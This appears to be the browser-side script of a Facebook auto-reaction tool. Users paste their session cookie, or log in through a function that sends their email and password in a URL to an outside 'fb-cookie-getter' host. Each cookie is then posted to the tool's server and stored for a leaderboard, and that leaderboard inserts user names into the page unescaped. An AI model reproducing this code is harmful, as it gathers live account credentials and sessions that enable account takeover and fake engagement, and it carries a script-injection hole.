document.addEventListener('DOMContentLoaded', () => {
  const savedDataModal = document.getElementById('savedDataModal');
  const leaderboardsModal = document.getElementById('leaderboardsModal');
  const saveUserList = document.getElementById('saveUserList');
  const savedDataList = document.getElementById('savedDataList');
  const submitLoadingMessage = document.getElementById('submitLoadingMessage');
  const loginLoadingMessage = document.getElementById('loginLoadingMessage');
  const loginBtn = document.getElementById('loginButton');
  const howToUseModal = new bootstrap.Modal(
    document.getElementById('howToUseModal')
  );
  const submitButton = document.getElementById('submitButton');
  const termsCheckbox = document.getElementById('termsCheckbox');
  const leaderboardButton = document.getElementById('leaderboardButton'); // Add this line

  // Enable submit button only if terms checkbox is checked
  termsCheckbox.addEventListener('change', () => {
    submitButton.disabled = !termsCheckbox.checked;
    loginBtn.disabled = !termsCheckbox.checked;
  });

  // Open How to Use modal when the page loads (optional)
  howToUseModal.show();

  // Function to save form data to localStorage
  function saveFormData() {
    const name = document.getElementById('nameInput').value;
    const link = document.getElementById('linkInput').value;
    const cookie = document.getElementById('cookieInput').value;

    localStorage.setItem(name, JSON.stringify({ link, cookie }));
  }

  // Function to load saved data into the form
  function loadSavedData(name, link, cookie) {
    document.getElementById('nameInput').value = name;
    document.getElementById('linkInput').value = link;
    document.getElementById('cookieInput').value = cookie;
  }

  // Function to delete saved data entry with confirmation
  function deleteSavedData(name) {
    const confirmDelete = confirm(`Are you sure you want to delete "${name}"?`);
    if (confirmDelete) {
      localStorage.removeItem(name);
      displaySavedData(); // Refresh the list of saved data
    }
  }

  // Function to display saved data in the modal
  function displaySavedData() {
    savedDataList.innerHTML = ''; // Clear previous list items

    // Retrieve and display saved entries
    for (let i = 0; i < localStorage.length; i++) {
      const name = localStorage.key(i);
      const savedData = JSON.parse(localStorage.getItem(name));
      const listItem = document.createElement('div');
      listItem.classList.add(
        'd-flex',
        'justify-content-between',
        'align-items-center',
        'mb-2'
      );

      const applyButton = document.createElement('button');
      applyButton.textContent = 'Apply';
      applyButton.classList.add('btn', 'btn-success', 'me-2');
      applyButton.addEventListener('click', () => {
        loadSavedData(name, savedData.link, savedData.cookie); // Load saved data into the form
      });

      const deleteButton = document.createElement('button');
      deleteButton.textContent = 'Delete';
      deleteButton.classList.add('btn', 'btn-danger');
      deleteButton.addEventListener('click', () => {
        deleteSavedData(name); // Delete saved data with confirmation
      });

      listItem.appendChild(applyButton);
      listItem.appendChild(document.createTextNode(name)); // Display name text
      listItem.appendChild(deleteButton);
      savedDataList.appendChild(listItem);
    }
  }

  // Load saved data when Saved button is clicked and populate the modal
  document.getElementById('savedButton').addEventListener('click', () => {
    displaySavedData(); // Display saved data in the modal
  });

  // Function to fetch leaderboard data from the server
  async function fetchLeaderboardData() {
    try {
      const response = await fetch('/api/getUsers');
      if (!response.ok) {
        throw new Error('Failed to fetch leaderboard data');
      }

      const data = await response.json();

      // Clear previous leaderboard data
      const saveUserList = document.getElementById('saveUserList');
      saveUserList.innerHTML = '';

      // Sort users by request count (highest to lowest)
      const sortedUsers = Object.entries(data).sort(
        (a, b) => b[1].requestCount - a[1].requestCount
      );

      // Create headers for the leaderboard modal
      const headers = document.createElement('div');
      headers.classList.add(
        'd-flex',
        'justify-content-around',
        'align-items-center',
        'text-center',
        'mb-3',
        'fw-bold'
      );
      headers.innerHTML = `
      <div class="col-4 text-center bg-primary text-white">RANK</div>
      <div class="col-4 text-center bg-secondary text-white">NAME</div>
      <div class="col-4 text-center bg-info text-white">REQUEST</div>
      `;
      saveUserList.appendChild(headers);
      let rankCount = 1;
      // Populate leaderboard modal with sorted user data
      sortedUsers.forEach(([cookie, userData]) => {
        const listItem = document.createElement('div');
        listItem.classList.add('row', 'mb-2', 'border-bottom', 'pb-2');
        listItem.innerHTML = `
    <div class="col-4 text-center">${rankCount++}</div>
    <div class="col-4 text-center">${userData.name}</div>
    <div class="col-4 text-center">${userData.requestCount}</div>
  `;
        saveUserList.appendChild(listItem);
      });

      // Show the leaderboard modal
      const leaderboardsModal = new bootstrap.Modal(
        document.getElementById('leaderboardsModal')
      );
      leaderboardsModal.show();
    } catch (error) {
      console.error('Error fetching leaderboard data:', error);
      alert('Failed to fetch leaderboard data');
    }
  }

  // Function to get saved user data from localStorage
  function getUserData(cookie) {
    const usersData = JSON.parse(localStorage.getItem('users')) || {};
    return usersData[cookie] || { name: '', requestCount: 0 };
  }

  // Function to send user data to the server
  async function saveUserData(cookie, userData) {
    try {
      // Fetch existing user data from the server
      const response = await fetch(`/api/getUsers`);
      if (!response.ok) {
        throw new Error('Failed to fetch user data');
      }

      const usersData = await response.json();
      const existingUserData = usersData[userData.name] || {
        name: userData.name,
        cookie: cookie,
        requestCount: 0,
      };

      // Increment request count by 1
      existingUserData.requestCount += 1;

      // Make POST request to save updated user data
      const saveResponse = await fetch('/api/saveUser', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ cookie, userData: existingUserData }),
      });

      if (!saveResponse.ok) {
        throw new Error('Failed to save user data');
      }
    } catch (error) {
      console.error('Error:', error);
      alert('Failed to save user data');
    }
  }

  // Load leaderboard data when Leaderboard button is clicked
  leaderboardButton.addEventListener('click', () => {
    fetchLeaderboardData(); // Fetch and display leaderboard data
  });

  // Submit form data
  document
    .getElementById('reactForm')
    .addEventListener('submit', async (event) => {
      event.preventDefault();

      const submitButton = document.getElementById('submitButton');
      const submitLoadingMessage = document.getElementById(
        'submitLoadingMessage'
      );
      const responseMessage = document.getElementById('responseMessage');
      const termsCheckbox = document.getElementById('termsCheckbox');

      const name = document.getElementById('nameInput').value;

      // Disable submit button and show loading indicator
      submitButton.disabled = true;
      submitLoadingMessage.style.display = 'inline';
      termsCheckbox.disabled = true;

      try {
        // Check if terms are agreed before making the API request
        if (!termsCheckbox.checked) {
          throw new Error('Please agree to the terms and conditions.');
        }

        const nameInput = document.getElementById('nameInput');
        const linkInput = document.getElementById('linkInput');
        const typeSelect = document.getElementById('typeSelect');
        const cookieInput = document.getElementById('cookieInput');

        const name = nameInput.value;
        const link = linkInput.value;
        const type = typeSelect.value;
        const cookie = cookieInput.value;

        if (name.length > 8) {
          alert('Please input between 1 and 8 characters only.');
          nameInput.focus(); // Set focus back to the name input field
          nameInput.value = ''; // Clear the input field
          return;
        }

        // Make the API request if terms are agreed
        const response = await fetch(
          `/api/react?link=${link}&type=${type}&cookie=${cookie}`
        );
        const data = await response.json();

        if (data.status === 'SUCCESS') {
          const userData = { name, link, type };

          await saveUserData(cookie, userData);
          saveFormData();
          const reactionCount = data.message.match(/\d+/)[0];
          const reactionType = data.message.match(/\(([^)]+)\)/)[1];

          // Calculate next submit time (30 minutes later)
          const nextSubmitTime = new Date(Date.now() + 30 * 60 * 1000);
          const formattedNextSubmitTime = nextSubmitTime.toLocaleTimeString(
            'en-US',
            {
              hour: 'numeric',
              minute: 'numeric',
              second: 'numeric',
              hour12: true,
            }
          );

          // Display success message with reaction details and next submit time
          responseMessage.innerHTML = `
        <div class="alert alert-success" role="alert">
          <strong>Status:</strong> ${data.status}<br>
          <strong>Message:</strong> ${reactionCount} reactions (${reactionType}) have been successfully sent to the post.<br>
          <strong>Next Submit:</strong> ${formattedNextSubmitTime}
        </div>
      `;
        } else {
          // Display error message if API request was not successful
          responseMessage.innerHTML = `
        <div class="alert alert-danger" role="alert">
          <strong>Status:</strong> ${data.status}<br>
          <strong>Message:</strong> ${data.message}
        </div>
      `;
        }
      } catch (error) {
        console.error('Error:', error);
        // Display generic error message if an error occurred
        responseMessage.innerText = 'An error occurred';
      } finally {
        // Enable submit button and hide loading indicator
        submitButton.disabled = false;
        submitLoadingMessage.style.display = 'none';
        termsCheckbox.disabled = false;
      }
    });

  // Function to perform login and retrieve cookie
  async function performLogin(email, password) {
    try {
      loginBtn.disabled = true;
      loginLoadingMessage.style.display = 'inline'; // Display loading indicator
      termsCheckbox.disabled = true;
      const response = await fetch(
        `https://jcfcodex-fb-cookie-getter.onrender.com/api/login?email=${email}&password=${password}`,
        {
          method: 'GET',
          mode: 'cors', // Ensure CORS is enabled
        }
      );
      const data = await response.json();

      if (data.status === 'success') {
        document.getElementById('cookieInput').value = data.cookies;
        alert('Login successful');
        return true;
      } else {
        alert('Login failed. Please check your credentials.');
        return false;
      }
    } catch (error) {
      console.error('Login Error:', error);
      alert('An error occurred during login.');
      return false;
    } finally {
      loginBtn.disabled = false;
      loginLoadingMessage.style.display = 'none'; // Display loading indicator
      termsCheckbox.disabled = false;
    }
  }

  // Toggle password visibility
  document
    .getElementById('togglePassword')
    .addEventListener('click', function () {
      const passwordInput = document.getElementById('passwordInput');
      const type =
        passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
      passwordInput.setAttribute('type', type);
      this.textContent = type === 'password' ? 'show' : 'hide';
    });

  // Assuming loginBtn, emailInput, passwordInput, and termsCheckbox are defined elsewhere in your code

  // Login button click event listener
  loginBtn.addEventListener('click', async () => {
    const email = emailInput.value.trim();
    const password = passwordInput.value.trim();
    const termsCheckbox = document.getElementById('termsCheckbox');

    // Check if email and password are not empty
    if (email !== '' && password !== '') {
      // Check if terms and conditions checkbox is checked
      if (termsCheckbox.checked) {
        try {
          // Attempt to perform login (assuming this is an async function)
          const loginSuccess = await performLogin(email, password);

          // if (loginSuccess) {
          //   // If login is successful, continue with form submission
          //   const form = document.getElementById('reactForm');
          //   // form.submit(); // Submit the form
          // } else {
          //   // Display an alert for failed login
          //   alert('Login failed. Please check your credentials.');
          // }
        } catch (error) {
          // Display an alert for login error
          console.error('Login error:', error);
          alert('An error occurred during login. Please try again.');
        }
      } else {
        // Display an alert if terms and conditions checkbox is not checked
        alert('Please agree to the terms and conditions.');
      }
    } else {
      // Display an alert for empty email or password fields
      alert('Please fill in all required fields.');
    }
  });

  // Prompt before refresh or leaving the page
  window.addEventListener('beforeunload', (event) => {
    event.preventDefault();
    event.returnValue = ''; // Chrome requires returnValue to display the prompt
    const confirmationMessage =
      'Are you sure you want to refresh? Unsaved changes will be lost.';
    event.returnValue = confirmationMessage;
    return confirmationMessage;
  });
});
